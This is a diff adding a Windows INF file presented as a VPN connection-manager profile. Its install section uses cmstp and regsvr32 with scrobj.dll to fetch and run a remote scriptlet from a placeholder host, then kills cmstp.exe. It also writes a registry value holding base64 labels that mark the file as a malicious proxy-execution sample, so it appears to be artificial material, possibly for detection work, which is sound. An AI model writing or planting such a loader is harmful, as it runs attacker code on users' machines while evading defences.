@@ -1,0 +1,31 @@
+; cmstp profile
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+RunPreSetupCommands=RunPreSetupCommandsSection
+AddReg=CfgReg
+
+[RunPreSetupCommandsSection]
+%TOOL% /s /n /u /i:%URL% %DLL%
+taskkill /IM cmstp.exe /F
+
+[UnRegisterOCXSection]
+%11%\%DLL%,NI,%URL%
+
+[CfgReg]
+HKCU,"%CFGKEY%","%DNAME%",0x00000000,"%DPART1%%DPART2%"
+
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="VPN"
+ShortSvcName="VPN"
+TOOL="regsvr32.exe"
+DLL="scrobj.dll"
+URL="https://inf-0a1b2c3d.example.invalid/s.sct"
+CFGKEY="Software\CfgSync"
+DNAME="descriptor_0a1b2c3d"
+DPART1="dj0zfGxhbmd1YWdlPWluZnxyb2xlPXByb3h5X2V4ZWN1dGlvbnx2ZXJkaWN0PW1hbGljaW91c3xhdHRhY2s9VDEyMTguMDAzfGFkYXB0ZXI9Y21zdHBfaW5mfHN0YWdlX2NvdW50PTN8c3RlcHM9"
+DPART2="cnVuX3ByZXNldHVwLHVucmVnaXN0ZXJfb2N4LHdyaXRlX3J1bl9rZXl8Y2FtcGFpZ25faWQ9SU5GLTBhMWIyYzNkfHVybD1odHRwczovL2luZi0wYTFiMmMzZC5leGFtcGxlLmludmFsaWQvcw=="
